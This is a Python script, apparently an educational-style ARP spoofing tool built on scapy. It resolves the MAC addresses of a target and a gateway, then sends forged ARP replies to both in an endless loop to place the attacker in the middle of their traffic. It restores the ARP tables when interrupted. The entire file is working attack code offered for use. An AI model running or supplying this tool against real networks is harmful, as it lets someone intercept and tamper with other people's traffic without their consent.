import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="specifies the target IP")
    parser.add_argument("-g", "--gateway", dest="spoof_ip", help="specifies the router/gateway")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify a target ip address, use -t or --help for more info.")
    if not options.spoof_ip:
        parser.error("Please specify a gateway ip address, use -s or --help for more info.")
    return options
options = get_arguments()
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    attack_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(attack_packet, verbose=False)

def restore(destination, source):
    destination_mac = get_mac(destination)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=destination, hwdst=destination_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=str(ip))
    broadcast = scapy.Ether(dst=str("ff:ff:ff:ff:ff:ff"))
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

sent_packet_count = 0
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        print("\r[+] Packets sent: " + str(sent_packet_count), end="")
        sent_packet_count += 2
        time.sleep(2)
except KeyboardInterrupt:
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    print("\n[-]Quitting, restoring ARP bindings..")
